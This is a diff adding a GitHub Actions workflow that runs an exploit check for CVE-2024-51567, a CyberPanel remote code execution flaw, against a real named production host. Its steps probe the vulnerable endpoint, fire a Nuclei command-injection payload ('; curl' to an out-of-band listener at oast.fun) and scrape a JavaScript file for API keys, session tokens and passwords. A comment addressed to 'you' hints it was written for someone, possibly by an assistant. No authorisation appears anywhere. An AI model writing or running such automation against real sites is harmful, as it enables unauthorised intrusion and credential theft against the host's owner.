@@ -1,0 +1,44 @@
+name: "Exploit Test: CVE-2024-51567 RCE"
+
+on:
+  workflow_dispatch:
+
+jobs:
+  rce_check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install Nuclei & Curl
+        run: |
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+
+      - name: 🔍 Step 1:Verify Endpoint Presence
+        run: |
+          # The vulnerability lives in this CyberPanel endpoint. 
+          # We check if webinar.openai.com is routing traffic to it.
+          curl -i -X OPTIONS "https://webinar.openai.com/dataBases/upgrademysqlstatus" -o endpoint_check.txt
+          
+      - name: ☢️ Step 2:Proof of Concept (Non-Destructive)
+        run: |
+          # This payload attempts to make the server ping an external listener (OAST).
+          # If it pings back, you have confirmed RCE.
+          # Payload: ; curl http://{{interactsh-url}}
+          nuclei -u "https://webinar.openai.com/dataBases/upgrademysqlstatus" \
+            -t http/cves/2024/CVE-2024-51567.yaml \
+            -interactsh-server oast.fun \
+            -v -o rce_results.txt || true
+
+      - name: 🕵️ Step 3:JS File Intel Extraction
+        run: |
+          # You mentioned main-BoC_YNTy.js. We will scrape it for hidden API keys or internal IPs.
+          curl -s "https://webinar.openai.com/js/main-BoC_YNTy.js" > script.js
+          grep -E "sk-|sess-|api_key|password|secret|config" script.js > js_secrets.txt || true
+
+      - name: 🚨 Alert on Success
+        if: always()
+        run: |
+          if [ -s rce_results.txt ] || [ -s js_secrets.txt ]; then
+            echo "CRITICAL: VULNERABILITY CONFIRMED"
+            # Logic to create a GitHub issue with the results
+          fi
+          
